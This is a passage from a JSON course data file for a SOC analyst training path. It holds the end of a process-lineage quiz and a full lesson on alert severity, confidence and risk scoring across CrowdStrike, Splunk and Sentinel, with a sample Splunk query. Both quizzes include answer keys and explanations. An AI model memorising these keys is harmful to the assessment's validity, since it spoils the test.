        "question": "An analyst sees a svchost.exe process whose recorded parent is not services.exe. Based on this lesson's normal lineage map, what should the analyst suspect?",
        "options": [
          {
            "label": "This is completely normal, since svchost.exe can legitimately be launched by any parent process",
            "value": "a"
          },
          {
            "label": "This likely indicates process masquerading, since legitimate svchost.exe processes are always children of services.exe",
            "value": "b"
          },
          {
            "label": "This means the host has not finished booting yet",
            "value": "c"
          },
          {
            "label": "This means the EDR agent itself is malfunctioning and should be reinstalled immediately",
            "value": "d"
          }
        ],
        "answer": "b",
        "explanation": "The lesson states directly that legitimate svchost.exe processes are always children of services.exe, so any other parent is an immediate red flag for process masquerading: a malicious file named svchost.exe to blend in, rather than a real service host process."
      },
      {
        "question": "Which MITRE ATT&CK tactics does Parent PID Spoofing (T1134.004) map to, and why would an attacker use it for each?",
        "options": [
          {
            "label": "Defense Evasion only, to make output logs shorter and easier to delete afterward",
            "value": "a"
          },
          {
            "label": "Collection only, to gather information about running processes on the host",
            "value": "b"
          },
          {
            "label": "Privilege Escalation and Defense Evasion, inheriting elevated traits from the claimed parent, and defeating parent-child detection rules",
            "value": "c"
          },
          {
            "label": "Initial Access only, since it is exclusively used to deliver the first payload onto a host",
            "value": "d"
          }
        ],
        "answer": "c",
        "explanation": "Parent PID Spoofing maps to both Privilege Escalation (potentially inheriting characteristics from a higher-privileged claimed parent) and Defense Evasion (defeating detection rules that flag unusual parent-child pairings). It is not primarily about log deletion, process discovery, or initial delivery of a payload."
      },
      {
        "question": "Rundll32.exe, Regsvr32.exe, and Mshta.exe are all sub-techniques filed under which parent ATT&CK technique and tactic?",
        "options": [
          {
            "label": "T1055 Process Injection, under the Privilege Escalation tactic",
            "value": "a"
          },
          {
            "label": "T1218 System Binary Proxy Execution, under the Defense Evasion tactic",
            "value": "b"
          },
          {
            "label": "T1027 Obfuscated Files or Information, under the Collection tactic",
            "value": "c"
          },
          {
            "label": "T1078 Valid Accounts, under the Initial Access tactic",
            "value": "d"
          }
        ],
        "answer": "b",
        "explanation": "All three are sub-techniques of T1218 (System Binary Proxy Execution), under the Defense Evasion tactic, abusing legitimate, signed Windows utilities to execute malicious code while blending into normal telemetry. Process Injection, Obfuscated Files or Information, and Valid Accounts are distinct techniques covering different attacker behaviors."
      },
      {
        "question": "In the full attack chain from the practice scenario (WINWORD.EXE to cmd.exe to powershell.exe to rundll32.exe to an external network connection), why does this lesson argue that tracing the full chain matters more than looking at the final rundll32.exe network connection alone?",
        "options": [
          {
            "label": "Because rundll32.exe making any outbound network connection is always malicious on its own and never needs any further investigative context",
            "value": "a"
          },
          {
            "label": "Because network connections are never recorded by EDR platforms and must be inferred from process names alone",
            "value": "b"
          },
          {
            "label": "Because cmd.exe and powershell.exe are always benign and can be safely ignored in any chain",
            "value": "c"
          },
          {
            "label": "Because a signed Windows utility making a network connection looks unremarkable in isolation, only the full lineage back to the phishing email reveals the true severity",
            "value": "d"
          }
        ],
        "answer": "d",
        "explanation": "The lesson explains that a legitimate, signed utility like rundll32.exe making a network connection is common and unremarkable in isolation. It is only by tracing the full lineage back through cmd.exe, WINWORD.EXE, and the original phishing email that the true severity becomes clear, which is the entire practical point of building lineage-reading skill."
      }
    ]
  },
  "soc-analyst--severity-vs-risk-score": {
    "pages": [
      {
        "pageNumber": 1,
        "video": {
          "src": "/lesson-videos/severity-vs-risk-score/severity-vs-risk-score.mp4",
          "caption": "Explainer: Severity vs. Risk Score · subtitles: English · עברית · Español (CC menu)",
          "tracks": [
            { "srclang": "en", "label": "English", "src": "/lesson-videos/severity-vs-risk-score/en.vtt", "default": true },
            { "srclang": "he", "label": "עברית", "src": "/lesson-videos/severity-vs-risk-score/he.vtt" },
            { "srclang": "es", "label": "Español", "src": "/lesson-videos/severity-vs-risk-score/es.vtt" }
          ]
        },
        "title": "Why Severity Alone Isn't Enough",
        "body": "Throughout this Learning Path, you have seen the word \"severity\" attached to alerts: a CrowdStrike Falcon detection with SeverityName \"High,\" a Microsoft Sentinel incident labeled \"Medium.\" It is tempting to treat severity as the single number that tells you how urgently to act. This lesson argues that treating severity as the whole story is a mistake, and introduces the additional concepts, confidence and risk score, that a mature SOC uses alongside it.\n\n### A motivating example\nImagine two alerts arrive in the queue at the same moment, both labeled Medium severity by their respective detection rules. Alert One: a single failed login attempt on a shared, read-only reporting account with no access to sensitive systems. Alert Two: a single failed login attempt on a domain administrator account (an account that, if compromised, could grant control over the entire network) that has never failed a login in its multi-year history. Both alerts carry the identical severity label. Almost every analyst's intuition immediately says these two alerts do not deserve equal attention, and that intuition is correct.\n\n### Where the gap comes from\nSeverity, as the previous module's lesson on reading EDR alerts explained, is typically pre-assigned by the detection rule itself: a static property of the rule, not of the specific instance that fired it. It tells you how the rule's designer categorized this *type* of behavior in general. It does not, by itself, capture how unusual this specific instance is for this specific account (that is closer to **confidence**), nor how much damage a real compromise of this specific asset or identity would cause (that is closer to **risk**).\n\n### What this lesson builds\nThe remaining pages define severity, confidence, and risk score precisely, walk through how three different real platforms (CrowdStrike Falcon, Splunk Enterprise Security, and Microsoft Sentinel) actually implement these ideas, and close with a practical mental formula for combining them into one prioritization judgment, extending the risk-based thinking (likelihood x impact) from the Mental Models for Triage lesson with the additional layer of accumulated, entity-level risk.",
        "keyPoints": [
          "Two alerts can share identical severity labels while deserving completely different levels of urgency",
          "Severity is typically a static property of the detection rule's type, not of the specific instance that fired it",
          "Confidence captures how unusual an instance is; risk score captures potential damage and accumulated context",
          "This lesson extends the earlier likelihood x impact framework with vendor-specific implementations of risk scoring"
        ]
      },
      {
        "pageNumber": 2,
        "title": "Three Different Numbers: Severity, Confidence, and Risk Score",
        "body": "Before looking at specific vendors, it is worth defining these three related but distinct concepts precisely, since beginners often use them interchangeably when they should not be.\n\n### Severity\nA categorization of how dangerous a given *type* of detected behavior generally is, usually assigned by the detection rule's author at the time the rule is written. It answers: \"if this pattern really is malicious, how bad is this class of activity in general?\" It is typically static, the same rule produces the same severity label every time it fires, regardless of which specific host, user, or moment triggered it.\n\n### Confidence\nA measure of how certain the system is that this specific instance actually represents the behavior the rule is looking for, rather than a coincidental match or noise. A rule might have high confidence (the exact pattern matched precisely) but the underlying activity could still turn out to be a Benign True Positive (recall the verdict taxonomy from the Mental Models lesson). Confidence is about certainty of the *pattern match*, not certainty of malicious *intent*.\n\n### Risk Score\nA dynamic, often accumulating number that reflects the estimated real-world danger of a specific entity (a user, host, or IP address) based on everything currently known about it: potentially combining severity, confidence, asset criticality, and historical behavior into one running total. Unlike severity, risk score is expected to change over time as new evidence accumulates for that specific entity.\n\n### Why the distinction matters for triage\nApplying this lesson's opening example: both alerts had the same severity. But the domain administrator account's alert should carry much higher effective risk, because a compromise of that specific identity has far greater potential impact: exactly the kind of context a well-designed risk score is built to capture, and that a static severity label cannot.\n\n### A note on terminology consistency across vendors\nNot every vendor uses all three terms, and some blend concepts together under different names. The next three pages walk through how three specific, real platforms actually implement these ideas in practice.",
        "keyPoints": [
          "Severity categorizes how dangerous a type of behavior generally is, typically static per detection rule",
          "Confidence measures certainty of the pattern match, not certainty of malicious intent",
          "Risk score is a dynamic, often accumulating estimate of real-world danger for a specific entity",
          "Risk score is what can differentiate two alerts sharing identical severity but very different real-world stakes"
        ]
      },
      {
        "pageNumber": 3,
        "title": "Vendor Example: CrowdStrike Falcon Severity",
        "body": "The previous module's lesson on reading EDR alerts already introduced CrowdStrike Falcon's severity fields. This page revisits them specifically through the severity-vs-risk lens of this lesson.\n\n### The fields, revisited\nCrowdStrike Falcon detections carry both a numeric **Severity** score and a categorical **SeverityName**: Informational, Low, Medium, High, or Critical. As covered previously, these values are associated with the detection pattern that matched. They describe the type of behavior detected, in line with this lesson's definition of severity as a largely static, rule-level property.\n\n### What Falcon's severity fields do not capture on their own\nFalcon's Severity and SeverityName fields do not, by themselves, encode which specific host or account was affected, nor that account's business criticality, nor how this specific instance compares to that account's own historical baseline. Two detections of the identical technical pattern (say, the same suspicious PowerShell pattern) occurring on two different hosts will typically carry the same Severity and SeverityName, even if one host belongs to a summer intern and the other belongs to the CFO.\n\n### Where entity context has to come from instead\nThis means an analyst using Falcon alone has to supply the asset-and-identity context manually (checking the account's role, the host's business function, and its prior history) exactly the \"Correlate\" step from the Mental Models for Triage checklist. This is precisely the gap that the next two pages' vendor examples (Splunk's Risk-Based Alerting and Microsoft Sentinel's incident model) are designed to help close more systematically, by building entity-level risk directly into the platform rather than leaving it entirely to manual analyst judgment.\n\n### The takeaway for this vendor\nFalcon's severity system is a well-designed, useful signal for the *type* of behavior, but per this lesson's core argument, it should never be read as a complete substitute for asset-and-identity-aware risk judgment.",
        "keyPoints": [
          "CrowdStrike Falcon's Severity and SeverityName describe the detected behavior pattern's type, largely independent of which specific entity was affected",
          "Two detections of the identical pattern on different hosts typically carry the same severity label regardless of asset criticality",
          "An analyst using Falcon alone must manually supply entity context via the Correlate step of the triage checklist",
          "Severity is a useful signal but not a substitute for asset-and-identity-aware risk judgment"
        ]
      },
      {
        "pageNumber": 4,
        "title": "Vendor Example: Splunk Enterprise Security Risk-Based Alerting",
        "body": "Splunk Enterprise Security implements one of the most explicit, purpose-built risk-scoring systems in the industry, called **Risk-Based Alerting (RBA)**: a direct, real-world example of the dynamic, accumulating risk score concept from page 2.\n\n### How it works\nRather than every detection rule generating a full alert immediately, RBA-configured rules instead generate an **intermediate finding**, called a risk event, stored in a dedicated **risk index**. Each risk event carries a **risk score contribution** assigned by the rule (its risk modifier). Splunk Enterprise Security's Risk Framework aggregates these contributions per **entity** (a user, host, or other asset) over a configurable time window, producing one running, aggregated risk score for that entity.\n\n### Why aggregation matters\nThis directly enables the exact scenario from page 1: a single low-severity risk event on its own might not warrant an alert. But if the same user or host accumulates several separate, individually low-severity risk events within a short window. Say, an unusual login, followed by an unusual process execution, followed by an unusual outbound connection: their aggregated risk score can cross a defined threshold, at which point Splunk generates a **Risk Notable**, a genuine alert for an analyst to review, carrying far more context than any single underlying event would have on its own.\n\n### The role of MITRE ATT&CK annotation\nRisk rules in Splunk Enterprise Security are commonly annotated with the relevant MITRE ATT&CK tactic or technique, so that an analyst reviewing a Risk Notable can see not just an accumulated number, but which specific attacker behaviors contributed to it. Directly connecting the risk-scoring system to the ATT&CK-mapping skills from the previous module.\n\n### Why this is a genuinely different model from static severity\nUnlike CrowdStrike's per-detection Severity field, Splunk's risk score is fundamentally about the *entity*, accumulated *across events and time*. It is the clearest real-world implementation of this lesson's core distinction between a static, rule-level severity and a dynamic, entity-level risk score.",
        "codeExample": "# Simplified Splunk Enterprise Security risk-scoring concept\nindex=risk\n| stats sum(risk_score) as total_risk by risk_object, risk_object_type\n| where total_risk >= 80\n| sort - total_risk",
        "keyPoints": [
          "Splunk Risk-Based Alerting stores individual risk events with a risk score contribution in a dedicated risk index",
          "Risk scores aggregate per entity (user, host, asset) over time, rather than resetting with each new event",
          "A Risk Notable fires when an entity's aggregated risk score crosses a threshold, even if no single event was severe alone",
          "MITRE ATT&CK annotation on risk rules shows an analyst which specific attacker behaviors contributed to a Risk Notable"
        ]
      },
      {
        "pageNumber": 5,
        "title": "Vendor Example: Microsoft Sentinel Incident Severity",
        "body": "Microsoft Sentinel takes a somewhat different approach from both CrowdStrike's static per-detection severity and Splunk's explicit entity-level risk accumulation, worth understanding as a third real-world pattern.\n\n### Sentinel's severity model\nAs covered in the previous module, Microsoft Sentinel incidents are labeled with one of four severity levels: Informational, Low, Medium, or High. Like CrowdStrike's model, this severity is generally assigned based on the underlying analytics rule's design: a property of the *type* of detected behavior, not a bespoke per-instance calculation.\n\n### Why entity context still matters even with a fixed severity scale\nSentinel's own guidance to analysts emphasizes prioritizing incidents not purely by severity label but by a combination of severity, incident age, and business impact. Explicitly acknowledging that the raw severity field alone is an incomplete prioritization signal, echoing this lesson's central argument. An incident affecting a critical system or a high-value user should be treated with elevated urgency even when its raw severity label does not, by itself, distinguish it from a similar incident on a lower-value asset.\n\n### Practical implication for an analyst working in Sentinel\nBecause Sentinel does not provide as explicit and automatic an entity-level accumulated risk score as Splunk's Risk-Based Alerting, an analyst working in Sentinel needs to actively apply the \"Calculate\" step from the Mental Models for Triage checklist themselves. Consciously factoring in what asset or identity is involved, rather than relying on the platform to have already done that calculation for them.\n\n### Comparing the three vendors' approaches side by side\n| Platform | Severity approach | Entity-level risk accumulation |\n|---|---|---|\n| CrowdStrike Falcon | Static, per-detection, five-tier (Informational to Critical) | Not built in. Analyst applies context manually |\n| Splunk Enterprise Security | Per-event risk score contribution | Built in. Risk-Based Alerting aggregates per entity automatically |\n| Microsoft Sentinel | Static, per-incident, four-tier (Informational to High) | Guidance recommends manual consideration of business impact |\n\nUnderstanding which model a given platform uses tells you exactly how much of the risk-based thinking work the tool has already done for you, and how much is still squarely the analyst's job.",
        "keyPoints": [
          "Microsoft Sentinel's four-tier severity (Informational to High) is generally tied to the analytics rule's design, similar to CrowdStrike's model",
          "Sentinel's own guidance recommends prioritizing by severity, age, and business impact together, not severity alone",
          "Unlike Splunk's Risk-Based Alerting, Sentinel does not automatically accumulate entity-level risk scores out of the box",
          "Knowing which platform model is in use tells an analyst how much risk-context work the tool has already done versus what remains manual"
        ]
      },
      {
        "pageNumber": 6,
        "title": "Asset and Identity Context: Why the Same Alert Isn't Equal",
        "body": "Having seen three real platforms' approaches, this page focuses squarely on the underlying principle they all, in different ways, are trying to address: **asset and identity criticality**.\n\n### What makes an asset \"critical\"\nNot all hosts and accounts carry equal weight in an organization. Common markers of high criticality include: domain controllers (servers that manage authentication for the entire network), systems processing regulated data (financial records, health information), accounts with broad administrative privileges, and executive or finance accounts with the authority to approve transactions. A compromise of any of these has a categorically larger blast radius than a compromise of, say, a shared conference-room kiosk with no stored data and no network privileges beyond internet browsing.\n\n### Why criticality should be established before an alert ever fires\nA mature SOC does not wait until an incident to figure out which assets matter most. It maintains this classification proactively, often as part of an asset inventory or a Configuration Management Database (CMDB), so that when an alert does fire, the analyst (or, in Splunk's case, the automated risk framework) can immediately look up whether the affected host or account belongs to a high-criticality category.\n\n### The dev VM vs. domain controller example\nConsider identical Medium-severity, Medium-confidence detections on two different hosts: an isolated development virtual machine used for testing, with no production data and no path to anything else on the network, versus a domain controller. Despite carrying the exact same severity and confidence values from the detection rule, the domain controller alert deserves dramatically higher priority, because its potential impact (if the detection turns out to be a genuine compromise) is incomparably larger.\n\n### Connecting back to the tier model\nRecall from the SOC Foundations module that impact assessment directly feeds into escalation urgency and SLA prioritization. An analyst who recognizes elevated asset criticality early should factor that into how quickly they escalate, even if the technical severity label alone would not, by itself, demand the same urgency.",
        "keyPoints": [
          "Domain controllers, regulated-data systems, and high-privilege accounts are common markers of high asset criticality",
          "A mature SOC classifies asset criticality proactively, often via an asset inventory or CMDB, before any alert fires",
          "Identical severity and confidence values can warrant very different urgency depending on the affected asset's criticality",
          "Recognizing elevated asset criticality should directly influence how quickly an analyst escalates"
        ]
      },
      {
        "pageNumber": 7,
        "title": "Worked Example: Two Alerts, Same Severity, Different Priority",
        "body": "Let's apply everything from this lesson to a concrete, side-by-side comparison, similar in spirit to the previous module's benign-vs-malicious worked comparison, but focused specifically on prioritization rather than verdict.\n\n### Alert One: NexaCorp's finance server\nA Medium-severity detection fires: an unusual outbound connection from a server in the finance department's network segment to an external IP address, matching a moderately confident pattern for potential data staging. The server hosts the accounts-receivable database, containing customer payment records.\n\n### Alert Two: NexaCorp's print server\nAn identical Medium-severity detection, with an identical confidence level, fires on an isolated print server that only ever communicates with networked printers and has no access to any sensitive data or other systems.\n\n### Applying the lesson's framework\nBoth alerts share identical severity (Medium) and identical confidence (moderate). Under a severity-only prioritization approach, they would be queued with equal urgency. Applying asset criticality from page 6, however, the finance server's role, hosting sensitive payment data, gives it dramatically higher potential impact than the isolated print server. Under a Splunk-style Risk-Based Alerting model, the finance server's aggregated entity risk score would likely already be elevated due to its criticality classification, potentially triggering a Risk Notable that the print server's identical event would not.\n\n### The prioritization decision\nAlert One (finance server) should be escalated and investigated immediately, ahead of Alert Two, despite sharing identical severity and confidence: precisely because impact, driven by asset criticality, is the differentiator. Alert Two still deserves investigation and should not be ignored, but it can reasonably wait behind higher-impact work in the queue.\n\n### Why this worked example matters\nThis is the practical payoff of the entire lesson: severity and confidence tell you about the detection itself; asset criticality and accumulated risk tell you about the stakes. An analyst who only reads the severity field would treat these two alerts identically, and would be wrong to do so.",
        "keyPoints": [
          "Two alerts with identical severity and confidence can warrant very different prioritization based on asset criticality",
          "A Risk-Based Alerting model would likely reflect a critical asset's elevated risk automatically, unlike a static severity field",
          "Impact, driven by what the affected asset actually holds or controls, is the differentiator between the two alerts",
          "Reading severity alone and treating both alerts identically would be a prioritization mistake"
        ]
      },
      {
        "pageNumber": 8,
        "title": "A Mental Formula for Prioritization",
        "body": "To close this lesson: here is a practical way to combine everything covered into one working mental model you can apply to any alert.\n\n### The combined formula\nEffective priority is best thought of as a function of four inputs working together, not any single one in isolation:\n1. **Severity**: the detection rule's own static classification of how dangerous this type of behavior generally is\n2. **Confidence**, how certain the match is that this specific instance really represents the pattern the rule is looking for\n3. **Asset/identity criticality**, how much potential damage a genuine compromise of this specific host or account would cause\n4. **Accumulated risk**, where available (as in a Splunk-style Risk-Based Alerting model), how this event fits into a broader pattern of recent activity for the same entity\n\n### How to apply this without a formal risk-scoring platform\nNot every SOC has Splunk's Risk-Based Alerting or an equivalent automated system. Even without one, an analyst can apply this same four-factor thinking manually during the \"Calculate\" step of the Mental Models for Triage checklist: read the severity and confidence fields as usual, then deliberately pause to ask \"what does this asset or account actually control or contain,\" and \"have I seen anything else from this entity recently.\"\n\n### Why this closes the loop on the whole SOC Analyst learning path so far\nThis lesson's four-factor formula is the direct, technically-grounded extension of the likelihood x impact framework from the Mental Models for Triage lesson: severity and confidence together largely determine likelihood, while asset criticality and accumulated risk together determine impact. Recognizing that connection is the real goal of this lesson, not memorizing three vendors' field names, but seeing that every platform, in its own way, is trying to help an analyst answer the same underlying question this path has been building toward from its very first lesson: given everything I can see, how much does this actually matter?\n\n### Where this path goes next\nWith SOC structure, the tier model, triage mental models, EDR field-reading, process tree analysis, and now prioritization all covered, this module's final lesson, Containment basics, turns theory into hands-on response (isolating hosts, disabling accounts, blocking indicators) for a confirmed True Positive. After that, the next module in this path turns to MITRE ATT&CK in full depth: the framework whose Tactic and Technique fields you have already been reading throughout this module.",
        "keyPoints": [
          "Effective priority combines severity, confidence, asset/identity criticality, and accumulated risk, not any one factor alone",
          "Without an automated risk platform, an analyst applies this same four-factor thinking manually during triage's Calculate step",
          "Severity and confidence roughly map to likelihood; asset criticality and accumulated risk roughly map to impact",
          "Every platform's approach to severity and risk is ultimately trying to answer the same question: how much does this actually matter?"
        ]
      }
    ],
    "quiz": [
      {
        "question": "Two alerts arrive with identical Medium severity labels: one on a shared, read-only reporting account, and one on a domain administrator account that has never failed a login before. According to this lesson, why might these deserve very different levels of urgency despite sharing the same severity?",
        "options": [
          {
            "label": "Severity is a largely static property of the detection rule's type, and does not by itself capture the specific asset or identity's criticality and potential impact",
            "value": "a"
          },
          {
            "label": "Severity labels are randomly assigned and carry no real meaning in any platform",
            "value": "b"
          },
          {
            "label": "The domain administrator alert must be a False Positive simply because the account has no failed-login history",
            "value": "c"
          },
          {
            "label": "Both alerts should always be treated with identical urgency once severity is assigned, regardless of any other factor",
            "value": "d"
          }
        ],
        "answer": "a",
        "explanation": "The lesson's core argument is that severity is typically a static, rule-level classification of a behavior type, not a per-instance calculation that accounts for which specific asset or identity is involved, which is exactly why identical severity labels can still warrant very different urgency once asset and identity criticality are considered."
      },
      {
        "question": "A detection rule fires with high confidence that a specific pattern was matched precisely, but the underlying activity is later confirmed to be an authorized IT maintenance task. What does this lesson say about the relationship between confidence and verdict?",
        "options": [
          {
            "label": "High confidence in the pattern match automatically means the activity was malicious",
            "value": "a"
          },
          {
            "label": "This scenario is impossible, since a genuinely high-confidence pattern match can never coexist with authorized, legitimate business activity",
            "value": "b"
          },
          {
            "label": "Confidence measures certainty of the pattern match, not certainty of malicious intent: a high-confidence match can still turn out to be a Benign True Positive",
            "value": "c"
          },
          {
            "label": "Confidence and severity are simply two different names for the exact same underlying measurement",
            "value": "d"
          }
        ],
        "answer": "c",
        "explanation": "The lesson explicitly distinguishes confidence (certainty that the specific pattern was matched) from certainty of malicious intent. A rule can be highly confident it correctly identified its target pattern while the specific instance still turns out to be a Benign True Positive, exactly as this scenario describes."
      },
      {
        "question": "In Splunk Enterprise Security's Risk-Based Alerting, several individually low-severity risk events occur for the same user within a short time window: an unusual login, an unusual process execution, and an unusual outbound connection. What is the mechanism by which this could still produce an alert an analyst needs to review?",
        "options": [
          {
            "label": "Splunk ignores individually low-severity events entirely and they can never contribute to any alert",
            "value": "a"
          },
          {
            "label": "The aggregated risk score for that entity, summed across all its risk events, can cross a threshold and trigger a Risk Notable, even though no single event was severe alone",
            "value": "b"
          },
          {
            "label": "A human analyst must manually notice all three events independently before any alert can be generated",
            "value": "c"
          },
          {
            "label": "Each risk event immediately becomes its own full-severity alert regardless of its individual risk score contribution",
            "value": "d"
          }
        ],
        "answer": "b",
        "explanation": "Risk-Based Alerting aggregates risk score contributions per entity over a time window; when the aggregated total crosses a defined threshold, Splunk generates a Risk Notable. This is exactly the mechanism by which several individually minor events for the same entity can together produce a genuine, reviewable alert."
      },
      {
        "question": "According to this lesson's comparison of platforms, what is a key difference between how CrowdStrike Falcon and Splunk Enterprise Security's Risk-Based Alerting handle entity-level risk?",
        "options": [
          {
            "label": "Falcon automatically aggregates risk per entity over time and across many events, while Splunk requires entirely manual analyst calculation for every single case",
            "value": "a"
          },
          {
            "label": "Neither platform provides any severity or risk information at all, leaving everything to unaided manual analyst judgment",
            "value": "b"
          },
          {
            "label": "Both platforms use an identical five-tier severity scale with no meaningful differences in how risk is calculated",
            "value": "c"
          },
          {
            "label": "Falcon's severity describes the detection pattern's type without automatic per-entity aggregation, while Splunk's Risk-Based Alerting aggregates risk scores per entity over time",
            "value": "d"
          }
        ],
        "answer": "d",
        "explanation": "The lesson explains that Falcon's severity fields describe the type of detected behavior without automatic per-entity aggregation, while Splunk's Risk-Based Alerting is specifically built to aggregate risk score contributions per entity over time: the reverse of the first distractor's claim, and neither platform lacks severity information entirely."
      },
      {
        "question": "Two Medium-severity, Medium-confidence detections fire: one on an isolated print server with no access to sensitive data, and one on a server hosting a finance department's accounts-receivable database. Using the four-factor formula from this lesson (severity, confidence, asset/identity criticality, accumulated risk), how should these be prioritized?",
        "options": [
          {
            "label": "Identically, since severity and confidence are the only two factors this lesson considers relevant to prioritization",
            "value": "a"
          },
          {
            "label": "The finance server alert should be prioritized higher, since its much greater asset criticality raises overall impact and effective priority despite identical severity and confidence",
            "value": "b"
          },
          {
            "label": "The print server alert should be prioritized higher, since print servers are inherently more commonly targeted by attackers",
            "value": "c"
          },
          {
            "label": "Neither can be prioritized until a full forensic investigation is completed on both simultaneously",
            "value": "d"
          }
        ],
        "answer": "b",
        "explanation": "The four-factor formula explicitly includes asset/identity criticality alongside severity and confidence. Despite identical severity and confidence, the finance server's far greater potential impact (given the sensitive data it hosts) makes it the higher-priority alert, exactly as the lesson's worked example demonstrated."
      }
    ]
  }
};
